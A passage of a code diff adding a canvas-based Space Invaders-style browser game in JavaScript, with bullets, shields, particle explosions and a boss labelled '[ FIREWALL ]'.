+    nexusCanvas.onmousemove = (e) => movePlayer(e.clientX);
+    nexusCanvas.ontouchmove = (e) => { e.preventDefault(); movePlayer(e.touches[0].clientX); };
+    nexusCanvas.onclick = () => {
+        if (gameOver) { startInvaders(); return; }
+        if (bullets.length < 4) {
+            bullets.push({ x: playerX + 18, y: 330 });
+            SoundManager.playBloop(600, 0.03);
+        }
+    };
+
+    function tick(ts) {
+        if (!invadersActive) return;
+        
+        ctx.save();
+        if (shake > 0) {
+            ctx.translate((Math.random()-0.5)*shake, (Math.random()-0.5)*shake);
+            shake *= 0.9;
+        }
+
+        ctx.fillStyle = '#050510'; ctx.fillRect(0, 0, 400, 360);
+        
+        // Scanlines background
+        ctx.fillStyle = 'rgba(0, 255, 255, 0.03)';
+        for (let i = 0; i < 360; i += 4) ctx.fillRect(0, i, 400, 1);
+
+        if (!gameOver) {
+            // Player
+            ctx.fillStyle = '#0ff';
+            ctx.shadowBlur = 10; ctx.shadowColor = '#0ff';
+            ctx.fillRect(playerX, 330, 40, 10);
+            ctx.fillRect(playerX + 15, 320, 10, 10);
+            ctx.shadowBlur = 0;
+
+            // Bullets
+            bullets.forEach((b, i) => {
+                b.y -= 6; // SLOWER bullets for classic feel
+                ctx.fillStyle = '#fff'; ctx.fillRect(b.x, b.y, 3, 12);
+                
+                // Shield collision
+                shields.forEach((s, si) => {
+                    if (s.hp > 0 && b.x > s.x && b.x < s.x + 10 && b.y > s.y && b.y < s.y + 10) {
+                        s.hp--; bullets.splice(i, 1);
+                        SoundManager.playBloop(100, 0.02);
+                    }
+                });
+
+                if (b.y < 0) bullets.splice(i, 1);
+            });
+
+            // Shields
+            shields.forEach(s => {
+                if (s.hp <= 0) return;
+                ctx.fillStyle = `rgba(0, 255, 255, ${s.hp / 3})`;
+                ctx.fillRect(s.x, s.y, 9, 9);
+            });
+
+            // Particles
+            particles.forEach((p, i) => {
+                p.x += p.vx; p.y += p.vy; p.life -= 0.02;
+                ctx.fillStyle = p.color; ctx.globalAlpha = p.life;
+                ctx.fillRect(p.x, p.y, 3, 3);
+                if (p.life <= 0) particles.splice(i, 1);
+            });
+            ctx.globalAlpha = 1.0;
+
+            // Boss Logic
+            if (boss) {
+                if (boss.y < boss.targetY) boss.y += 1;
+                boss.x += boss.moveDir * 2;
+                if (boss.x > 300 || boss.x < 20) boss.moveDir *= -1;
+
+                // Boss health bar
+                ctx.fillStyle = '#333'; ctx.fillRect(100, 10, 200, 6);
+                ctx.fillStyle = '#f0f'; ctx.fillRect(100, 10, (boss.hp / boss.maxHp) * 200, 6);
+                
+                // Draw Boss
+                ctx.fillStyle = '#f0f'; ctx.font = 'bold 24px monospace';
+                ctx.fillText('[ FIREWALL ]', boss.x, boss.y);
+
+                // Bullet collision with Boss
+                bullets.forEach((b, bi) => {
+                    if (b.x > boss.x && b.x < boss.x + 120 && b.y > boss.y - 20 && b.y < boss.y) {
+                        boss.hp--; bullets.splice(bi, 1);
+                        createExplosion(b.x, b.y, '#f0f');
+                        shake = 4;
+                        SoundManager.playBloop(150, 0.02);
+                    }
+                });
+
+                if (boss.hp <= 0) {
+                    score += 500;
+                    createExplosion(boss.x + 60, boss.y, '#fff');
+                    boss = null;
+                    wave++;
+                    SoundManager.playBloop(800, 0.2);
+                    if (wave % 5 !== 0) initEnemies(); else spawnBoss();
+                }
+            }
+
+            // Regular Enemies
+            let edge = false;
+            enemies.forEach(e => {
+                if (!e.alive) return;
+                ctx.fillStyle = e.type % 2 === 0 ? '#f0f' : '#0f0';
+                ctx.font = 'bold 16px monospace';
+                const sprite = e.type % 2 === 0 ? '' : '';
                 ctx.fillText(sprite, e.x, e.y);
                 
                 if (e.x > 370 || e.x < 10) edge = true;
@@ -1573,6 +2375,3 @@ function stopAllGames() {
     cancelAnimationFrame(invadersRaf);
 }
 
-// =============================================================
-//  GOOGLE AUTHENTICATION
-// =============================================================
